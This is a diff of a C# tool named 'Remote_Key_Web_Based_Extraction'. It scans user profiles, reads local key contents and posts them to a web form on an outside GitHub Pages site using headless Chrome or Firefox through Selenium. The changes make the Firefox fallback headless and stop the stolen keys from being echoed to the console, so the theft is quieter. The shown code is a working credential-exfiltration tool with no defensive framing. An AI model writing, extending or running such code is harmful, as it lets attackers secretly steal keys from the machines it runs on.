@@ -1,12 +1,13 @@
 using System;
+using System.Diagnostics;
 using System.Collections.Generic;
 using System.Management.Automation;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Edge;
-using OpenQA.Selenium.Firefox;
-using System.Diagnostics;
-using Microsoft.WindowsAPICodePack.Net;
 using OpenQA.Selenium.Chrome;
+using OpenQA.Selenium.Firefox;
+using Microsoft.WindowsAPICodePack.Net;
+
 
 // https://github.com/PowerShell/PowerShell/issues/7909
 // dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
@@ -23,7 +24,6 @@ namespace Remote_Key_Web_Based_Extraction
             Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
             user_profiles_list = main_program.user_profiles_scan();
             string key_contents = main_program.local_key_content_extraction(user_profiles_list);
-            Console.WriteLine(key_contents);
             main_program.web_content_key_extraction(key_contents);
         }
         public List<string> user_profiles_scan()
@@ -84,11 +84,10 @@ namespace Remote_Key_Web_Based_Extraction
             */
             try
             {
-
+                Console.WriteLine("[=] Attempting to run Chrome Driver");
                 // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
                 var chromeOptions = new ChromeOptions();
                 chromeOptions.AddArguments("headless");
-                Console.WriteLine("[=] Attempting to try Chrome");
                 OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver(chromeOptions);
                 current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                 current_driver.FindElement(By.Name("message")).SendKeys(key_contents);
@@ -97,9 +96,11 @@ namespace Remote_Key_Web_Based_Extraction
             }
             catch (Exception e)
             {
+                Console.WriteLine("[=] Attempting to try FireFox Driver");
                 Console.WriteLine(e);
-                Console.WriteLine("[=] Attempting to try FireFox");
-                OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
+                FirefoxOptions fireFoxOptions = new FirefoxOptions();
+                fireFoxOptions.AddArgument("--headless");
+                OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver(fireFoxOptions);
                 current_drver.Navigate().GoToUrl("https://anthony-t-n.github.io/");
                 current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_contents);
                 current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
